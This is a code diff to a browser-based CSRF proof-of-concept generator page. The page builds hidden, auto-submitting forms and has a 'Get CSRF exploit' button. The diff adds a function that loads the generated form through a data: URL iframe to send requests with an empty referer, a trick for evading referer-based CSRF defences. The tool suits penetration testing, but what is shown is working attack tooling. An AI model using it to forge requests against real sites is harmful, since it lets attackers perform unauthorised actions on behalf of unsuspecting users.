@@ -11,7 +11,6 @@
 <div>
 <input onclick="switch_auto()" type="checkbox" id="c1"><label for="c1">Auto-submission</label>
 <input onclick="switch_base()" type="checkbox" id="c2"><label for="c2">Base64 URL</label>
-<input type="checkbox" id="c3"><label for="c3">Empty referrer [coming soon]</label>
 </div>
 
 <div id="form"></div>
@@ -56,6 +55,15 @@ function submit_to(to){
   return false;
 }
 
+function no_ref(){
+  /*
+  var x=new XMLHttpRequest;
+  x.open(form_obj.method, form_obj.url);
+  x.send(form_obj.data);
+  */
+  postme.src = 'data:text/html,'+get_html();
+}
+
 function switch_method(){
   var swap = (form_obj.method == 'GET') ? 'POST' : 'GET'
   form_obj.method = swap;
@@ -83,7 +91,7 @@ function get_inputs(){
 
 function get_html(){
   //alert invisible form
-  alert(generate_form(form_obj, false)+'<script>genform.submit()<'+'/script>');
+  return (generate_form(form_obj, false)+'<script>genform.submit()<'+'/script>');
 }
 
 function generate_form(obj, visible){
@@ -107,7 +115,7 @@ function generate_form(obj, visible){
     var out = '<p><a id="cur_method" title="Switch?" href="javascript:switch_method()">'+obj.method+'</a> <input size=120 value="'+esc(obj.url)+'" onchange="switch_url(this.value);"> </p>';
     out += '<div>'+outform+'</div>';
     out += '<div><input id="new_name" placeholder="name"> = <input id="new_value" placeholder="value"> <a href="javascript:update_fields(1);">add<a></div>';
-    out += '<p><input type="submit" onclick="return submit_to(\'_blank\')" value="New window"><input type="submit" onclick="return submit_to(\'_top\')" value="This window"><input type="submit" onclick="return submit_to(\'postme\')" value="Iframe below"> | <input type="submit" value="Get CSRF exploit" onclick="get_html();"></p>';
+    out += '<p><input type="submit" onclick="return submit_to(\'_blank\')" value="New window"><input type="submit" onclick="return submit_to(\'_top\')" value="This window"><input type="submit" onclick="return submit_to(\'postme\')" value="Iframe below"><input type="submit" onclick="return no_ref();" value="Empty referer"> | <input type="submit" value="Get CSRF exploit" onclick="alert(get_html());"></p>';
 
     out = '<div class="yelo">'+out+'</div>';
     return out;
